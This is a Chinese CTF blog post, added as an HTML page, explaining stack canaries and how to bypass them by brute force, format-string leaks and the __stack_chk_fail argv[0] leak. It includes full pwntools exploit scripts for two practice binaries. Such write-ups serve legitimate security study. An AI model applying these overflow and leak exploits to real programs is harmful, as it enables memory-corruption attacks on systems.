@@ -1,0 +1,1034 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="Closure" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      Bypass Canary 
+      
+      
+      |
+    
+     Closure
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Closure</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">主页</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">归档</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">关于我</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">Bypass Canary</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2023-11-05 16:54:04
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="标签"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/Bypass/" title="Bypass">
+                    #Bypass
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="Canary-Bypass"><a href="#Canary-Bypass" class="headerlink" title="Canary Bypass"></a>Canary Bypass</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Canary（金丝雀）：</p>
+<p>是一种用来防护栈溢出的保护机制。其原理实在一个函数的入口点，先从fs&#x2F;gs寄存器中取出一个字节（eax）或者8个字节（rax）的值存在栈上（最低位都为\x00），当函数结束时会检查这个栈上的值是否和存进去的值一致；</p>
+<p>Demo：</p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
+
+<span class="token keyword">void</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>input<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">char</span> buff<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token function">strcpy</span><span class="token punctuation">(</span>buff<span class="token punctuation">,</span> input<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> buff<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token function">foo</span><span class="token punctuation">(</span><span class="token string">"Hello, World!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+<p>GCC中使用Canary：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">-fstack-protector <span class="token comment">#启用保护, 不过只为局部变量中含有数组的函数插入保护</span>
+-fstack-protector-all <span class="token comment">#启用保护, 为所有函数插入保护 默认情况编译开启栈保护</span>
+-fstack-protector-strong <span class="token comment">#对包含有malloc族系或者内部的buffer大于8字节的或者包含局部数组的或者包含对local frame地址引用的函数使能Canary.</span>
+-fstack-protector-explicit <span class="token comment">#只对有明确 stack_protect attribute 的函数开启保护</span>
+-fno-stack-protector <span class="token comment">#禁用保护</span></code></pre>
+
+<p>关闭Canary编译：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">gcc canary.c <span class="token parameter variable">-o</span> canary -fno-stack-protector</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202310252210412.png"></p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202310252208517.png" alt="image-20231025220843457"></p>
+<p>开启Canary编译：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">gcc canary.c <span class="token parameter variable">-o</span> canary</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202310252211896.png"></p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202310252214478.png"></p>
+<p>&#x3D;&#x3D;》启用Canary后，在函数序言部分会取fs寄存器0x28处的值，存放至栈中rbp-0x8的位置</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202310252157809.png"></p>
+<p>&#x3D;&#x3D;》在函数返回前，会将该值取出，然后与原值进行对比：</p>
+<p>&#x3D;&#x3D;&#x3D;》若一致则正常退出</p>
+<p>&#x3D;&#x3D;&#x3D;》若是栈溢出或者其他原因导致Canary发生变化，那么程序将执行___stack_chk_fail函数（位于glibc中），然后终止程序：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202310252258883.png" alt="image-20231025225806841"></p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202310252258755.png" alt="image-20231025225852681"></p>
+<p>&#x3D;&#x3D;》</p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token keyword">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>noreturn<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">__stack_chk_fail</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token function">__fortify_fail</span> <span class="token punctuation">(</span><span class="token string">"stack smashing detected"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+ 
+<span class="token keyword">void</span> <span class="token keyword">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>noreturn<span class="token punctuation">)</span><span class="token punctuation">)</span> internal_function <span class="token function">__fortify_fail</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>msg<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token comment">/* The loop is added only to keep gcc happy.  */</span>
+  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+    <span class="token function">__libc_message</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"*** %s ***: %s terminated\n"</span><span class="token punctuation">,</span>
+                    msg<span class="token punctuation">,</span> __libc_argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">:</span> <span class="token string">"&lt;unknown>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+
+
+<h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><h3 id="爆破Canary"><a href="#爆破Canary" class="headerlink" title="爆破Canary"></a>爆破Canary</h3><p>对于Canary，每次进程重启后Canary都会发生变化</p>
+<p>但是在<strong>同一个进程</strong>中的<strong>不同线程的Canary是相同</strong>的&#x3D;&#x3D;》通过<strong>fork函数</strong>创建的子进程中的Canary也是相同的（因为fork函数会直接拷贝父进程）</p>
+<p><strong>爆破方式&#x2F;模板</strong>：最低位为0x00，之后逐次爆破（低位爆破），若爆破不成功，则程序崩溃，爆破成功则程序继续运行；</p>
+<pre class="language-python" data-language="python"><code class="language-python">Canary <span class="token operator">=</span> <span class="token string">b'\x00'</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#三个字节 若是x64改为7即可</span>
+    <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment">#00~ff</span>
+        log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'index: '</span><span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">": "</span> <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">100</span> <span class="token operator">+</span> Canary <span class="token operator">+</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#单字节覆盖</span>
+        re <span class="token operator">=</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"？？？？"</span><span class="token punctuation">)</span>  <span class="token comment">#程序继续运行</span>
+        <span class="token comment">#若在上方进程中通过检查则继续运行（进程未崩溃）</span>
+        <span class="token comment">#则继续输出“recv sucess”</span>
+        <span class="token keyword">if</span> <span class="token string">b"？？？？"</span> <span class="token keyword">in</span> re<span class="token punctuation">:</span>  
+                Canary <span class="token operator">+=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">)</span>
+                log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"Canary: "</span> <span class="token operator">+</span> Canary<span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+                <span class="token keyword">break</span></code></pre>
+
+
+
+<h4 id="bin1"><a href="#bin1" class="headerlink" title="bin1"></a>bin1</h4><p>检查程序，32位，开启了Canary和NX</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202310311318622.png" alt="image-20231031131856602"></p>
+<p>32位IDA打开看看：使用了fork创建子进程</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202310311321244.png" alt="image-20231031132156209"></p>
+<p>fun：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202310311322768.png"></p>
+<p>由于是32位程序，所以我们只需要爆破3个字节，范围都为00~ff；</p>
+<p>程序中还有一个后门函数，getflag：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202310311326090.png"></p>
+<p>&#x3D;&#x3D;》有fork函数，直接爆破获取Canary，栈溢出至后门函数即可；</p>
+<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><p>直接采用模板爆破即可：</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./bin1'</span><span class="token punctuation">)</span>
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./bin1'</span><span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+Canary <span class="token operator">=</span> <span class="token string">b'\x00'</span>
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#三个字节</span>
+    <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment">#00~ff</span>
+        log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'index: '</span><span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">": "</span> <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">100</span> <span class="token operator">+</span> Canary <span class="token operator">+</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#单字节覆盖</span>
+        re <span class="token operator">=</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"welcome\n"</span><span class="token punctuation">)</span>  <span class="token comment">#程序继续运行</span>
+        <span class="token comment">#若在上方进程中通过检查则继续运行（进程未崩溃）</span>
+        <span class="token comment">#则继续输出“recv sucess”</span>
+        <span class="token keyword">if</span> <span class="token string">b"sucess"</span> <span class="token keyword">in</span> re<span class="token punctuation">:</span>  
+                Canary <span class="token operator">+=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">)</span>
+                log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"Canary: "</span> <span class="token operator">+</span> Canary<span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+                <span class="token keyword">break</span>
+
+get_flag <span class="token operator">=</span> <span class="token number">0x804863B</span>
+payload <span class="token operator">=</span> <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token number">100</span> <span class="token operator">+</span> Canary <span class="token operator">+</span> <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token number">12</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>get_flag<span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+
+<p>本地结果：成功爆破Canary</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202310311802176.png" alt="image-20231031180230154"></p>
+<h3 id="泄露获取"><a href="#泄露获取" class="headerlink" title="泄露获取"></a>泄露获取</h3><p>Canary在设计中以’\x00’结尾，本意是保证Canary能截断字符串</p>
+<p>&#x3D;&#x3D;》1、泄露栈中的Canary的思路就可以是覆盖Canary的低字节来带出剩余的Canary部分；</p>
+<p>&#x3D;&#x3D;》2、也可以通过格式化字符串的漏洞泄漏出Canary的值：</p>
+<p><strong>常见格式化字符串函数：</strong></p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#输入</span>
+scanf
+
+<span class="token comment">#输出</span>
+printf<span class="token comment">#等同于fprintf，他的假定输出流位stdout</span>
+fprintf<span class="token comment">#三个参数为流，格式字符串，变参列表</span>
+vprintf
+sprintf
+snprintf
+vsprintf
+vsnprintf
+setproctitle
+syslog
+err<span class="token punctuation">,</span>verr<span class="token punctuation">,</span>warn<span class="token punctuation">,</span>vmarn等</code></pre>
+
+<p>转换规则：%[参数] [标志] [宽度] [精度] [长度] 转换指示符</p>
+<p><strong>例：</strong>printf</p>
+<pre class="language-c#" data-language="c#"><code class="language-c#">%d：打印成数字
+%x：打印成16进制
+%s：打印字符串(以\0结尾)
+%n：把前面已经打印的长度写入某个内存地址
+		向内存中写入任何值（任意地址）
+		%n：将已输出的字符串数全4字节写到指定地址
+		%hn：将已输出的字符串数低2字节写到指定地址
+		%hhn：将已输出的字符串数低1字节写到指定地址
+$:定位参数
+%10$x：打印第10个参数的16进制形式
+%10$s：打印第10个参数所指向的字符串
+%10c：打印10个空格</code></pre>
+
+<p>重点：确定Canary的偏移</p>
+<h3 id="Stack-smash（ssp-2-27以上失效）"><a href="#Stack-smash（ssp-2-27以上失效）" class="headerlink" title="Stack smash（ssp 2.27以上失效）"></a>Stack smash（ssp 2.27以上失效）</h3><p>利用报错函数__stack_chk_fail函数泄漏信息</p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token keyword">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>noreturn<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">__stack_chk_fail</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token function">__fortify_fail</span> <span class="token punctuation">(</span><span class="token string">"stack smashing detected"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+ 
+<span class="token keyword">void</span> <span class="token keyword">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>noreturn<span class="token punctuation">)</span><span class="token punctuation">)</span> internal_function <span class="token function">__fortify_fail</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>msg<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token comment">/* The loop is added only to keep gcc happy.  */</span>
+  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+    <span class="token function">__libc_message</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"*** %s ***: %s terminated\n"</span><span class="token punctuation">,</span>
+                    msg<span class="token punctuation">,</span> __libc_argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">:</span> <span class="token string">"&lt;unknown>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment">//这里简单理解成打印出报错信息即可，也就是可以泄露信息</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+<p>argc：命令的条数<br>argv[]：输入的每条命令 </p>
+<p>&#x3D;&#x3D;》打印argv[0]指针指向的字符串，正常情况下该指针指向<strong>程序名</strong></p>
+<p>&#x3D;&#x3D;&#x3D;》利用<strong>栈溢出</strong>覆盖argv[0]为想要输出的字符串地址（flag等）</p>
+<p>重点：argv[0]的偏移</p>
+<p>该方法与Glibc2.27以上失效：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202310252314197.png" alt="image-20231025231405146"></p>
+<h4 id="wdb2018-guess"><a href="#wdb2018-guess" class="headerlink" title="wdb2018_guess"></a>wdb2018_guess</h4><p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202310262316476.png"></p>
+<p>64位程序，且开启了NX和Canary，丢IDA里看看伪代码：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202310281554444.png" alt="image-20231028155409402"></p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202310281558936.png" alt="image-20231028155857903"></p>
+<p>一个比较明显的栈溢出，并且有fork函数创建子进程&#x3D;&#x3D;》那我们就先来触发一下栈溢出导致Canary：</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+io<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">"./GUESS"</span><span class="token punctuation">)</span>
+<span class="token comment">#context.log_level = 'debug'</span>
+
+payload <span class="token operator">=</span> <span class="token string">b"a"</span><span class="token operator">*</span><span class="token number">0x100</span>
+
+io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202310301412221.png" alt="image-20231030141250155"></p>
+<p>可以看到导致了程序stack smashing detected并输出了程序名&#x3D;&#x3D;》动态调试一下，找到这个存储程序名的__libc_argv[0]：</p>
+<p>直接下断点在输入上，写入4个a：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202310301443542.png" alt="image-20231030142755345"></p>
+<p>根据栈空间可判断输入点距离__libc_argv[0]为：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202310301443607.png" alt="image-20231030143016096"></p>
+<p>让我们再次触发栈溢出，测试下劫持__libc_argv[0]为puts@got是否能正常返回：</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+io<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">"./GUESS"</span><span class="token punctuation">)</span>
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./GUESS'</span><span class="token punctuation">)</span>
+context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
+
+puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
+
+payload <span class="token operator">=</span> <span class="token string">b"a"</span><span class="token operator">*</span><span class="token number">0x128</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202310301446299.png"></p>
+<p>符合预期，可以泄露地址，并且可以根据这个地址算出libc的基地址；</p>
+<p>事已至此，我们已经掌握了对报错函数__stack_chk_fail函数泄漏信息的利用，那我们整理下思路，看看怎么拿下这题：</p>
+<p>由于flag是被读到<strong>栈上</strong>的，所以我们考虑使用相同的方法将flag泄露出来，所以需要关于<strong>栈的地址</strong>&#x3D;&#x3D;》</p>
+<p>而<strong>栈的地址</strong>可以通过_<strong>environ</strong>函数获得，这个函数位于libc中，用于存放这<strong>当前进程的环境变量</strong>&#x3D;&#x3D;》</p>
+<p>通过libc找到environ地址，再泄露environ地址处的值就可以得到环境变量地址，环境变量保存在栈上，之后就可以通过偏移得到栈上任意变量的地址；</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202310311229939.png"></p>
+<p>在获取了_environ的地址（栈地址）后，就可以算一下这个地址和flag地址的<strong>偏移</strong>，之后依旧使用__stack_chk_fail将flag泄露出来；</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202310311224602.png" alt="image-20231031122410570"></p>
+<p>偏移：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202310311230649.png"></p>
+<h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+io<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">"./GUESS"</span><span class="token punctuation">)</span>
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./GUESS'</span><span class="token punctuation">)</span>
+libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/home/closure/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6'</span><span class="token punctuation">)</span>
+<span class="token comment">#context.log_level = 'debug'</span>
+
+puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
+
+payload <span class="token operator">=</span> <span class="token string">b"a"</span><span class="token operator">*</span><span class="token number">0x128</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'stack smashing detected ***: '</span><span class="token punctuation">)</span>
+puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+libc_base <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>
+environ_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__environ'</span><span class="token punctuation">]</span>
+
+log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'puts_addr: '</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base: '</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
+log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'environ_addr: '</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>environ_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+payload <span class="token operator">=</span> <span class="token string">b"a"</span><span class="token operator">*</span><span class="token number">0x128</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>environ_addr<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'stack smashing detected ***: '</span><span class="token punctuation">)</span>
+stack_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'stack_addr: '</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>stack_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+flag_addr <span class="token operator">=</span> stack_addr <span class="token operator">-</span> <span class="token number">0x168</span>
+payload <span class="token operator">=</span> <span class="token string">b"a"</span><span class="token operator">*</span><span class="token number">0x128</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>flag_addr<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+
+<p>本地结果：成功获得flag。</p>
